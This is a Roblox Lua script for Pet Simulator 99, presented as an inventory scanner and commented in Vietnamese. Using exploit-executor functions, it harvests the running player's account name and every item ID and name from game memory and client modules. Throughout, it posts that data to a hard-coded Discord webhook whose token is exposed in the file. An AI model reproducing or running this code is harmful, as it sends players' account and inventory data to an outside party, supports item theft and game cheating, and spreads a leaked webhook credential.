-- PS99 Full Inventory Scanner v3
local W = "https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) wait(1) end

local function sendList(title,lines)
    local N=30; local pages=math.ceil(#lines/N)
    for p=1,pages do
        local from=(p-1)*N+1; local to=math.min(p*N,#lines); local chunk={}
        for i=from,to do table.insert(chunk,lines[i]) end
        pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},
            Body=Http:JSONEncode({embeds={{title=string.format("%s (%d/%d)",title,p,pages),
            description="```\n"..table.concat(chunk,"\n").."\n```",
            footer={text=string.format("%d-%d/%d",from,to,#lines)},color=0x00ff88}}})}) end)
        wait(2.5)
    end
end

d("🟡 **KHO v3** | `"..plr.Name.."`", 0xffaa00)

-- =====================================================
-- STRATEGY 1: PlayerProfileCmds với retry 30s
-- =====================================================
local uidLines={} local total=0 local seen={}

local function extractFromTable(t)
    if type(t)~="table" then return end
    for _,item in pairs(t) do
        if type(item)=="table" then
            local uid=item.uid or item.Uid or item.UID or item.uniqueId or item.UniqueId
            local id =item.id  or item.Id  or item.ID  or item.name   or item.Name or item.itemId
            if type(uid)=="number" and uid>0 and type(id)=="string" and #id>0 and not seen[uid] then
                seen[uid]=true
                table.insert(uidLines, tostring(uid).."|"..id)
                total=total+1
            end
        end
    end
end

local function deepExtract(t, depth)
    if depth>3 or type(t)~="table" then return end
    for k,v in pairs(t) do
        if type(v)=="table" then
            extractFromTable(v)
            deepExtract(v, depth+1)
        end
    end
end

-- Thử PlayerProfileCmds.GetPlayerData với retry
local pOk, PPC = pcall(require, RS.Library.Client.PlayerProfileCmds)
if pOk and type(PPC)=="table" and type(PPC.GetPlayerData)=="function" then
    d("🔄 Thử PlayerProfileCmds (retry 30s)...", 0xffaa00)
    for attempt=1,6 do -- thử 6 lần, mỗi lần cách 5s
        local dok, data = pcall(PPC.GetPlayerData)
        if dok and data~=nil then
            deepExtract(data, 0)
            if total>0 then
                d("✅ PlayerProfileCmds OK! attempt="..attempt, 0x00ff00)
                break
            end
        end
        wait(5)
    end
end

-- =====================================================
-- STRATEGY 2: Các Client module khác có Get()
-- =====================================================
if total==0 then
    d("🔄 Thử các module khác...", 0xffaa00)
    local ClientFolder=nil
    pcall(function() ClientFolder=RS.Library.Client end)
    if ClientFolder then
        for _,child in ipairs(ClientFolder:GetChildren()) do
            if child:IsA("ModuleScript") then
                local ok,mod=pcall(require,child)
                if ok and type(mod)=="table" and type(mod.Get)=="function" then
                    local dok,data=pcall(mod.Get)
                    if dok and data~=nil then
                        deepExtract({data}, 0)
                        extractFromTable(data)
                    end
                end
            end
        end
    end
end

-- =====================================================
-- STRATEGY 3: getgc() toàn bộ
-- =====================================================
if total==0 then
    d("🔄 getgc() scan...", 0xffaa00)
    pcall(function()
        for _,v in pairs(getgc(true)) do
            if type(v)=="table" then
                extractFromTable(v)
            end
        end
    end)
end

-- =====================================================
-- Kết quả
-- =====================================================
if total==0 then
    d("❌ Không tìm được item nào!\n• Đứng in-game chưa?\n• Inventory có item không?\n• Thử chờ 15s rồi chạy lại", 0xff0000)
    return
end

table.sort(uidLines,function(a,b)
    local _,an=a:match("^([^|]+)|(.+)$")
    local _,bn=b:match("^([^|]+)|(.+)$")
    return (an or a)<(bn or b)
end)

d("📦 **"..total.." items** – đang gửi...", 0x00ccff)
wait(0.5)
sendList("Kho ["..plr.Name.."]", uidLines)
d("🏁 **XONG!**\n**Acc:** `"..plr.Name.."`\n**Tổng:** "..total.." items", 0x00ff88)
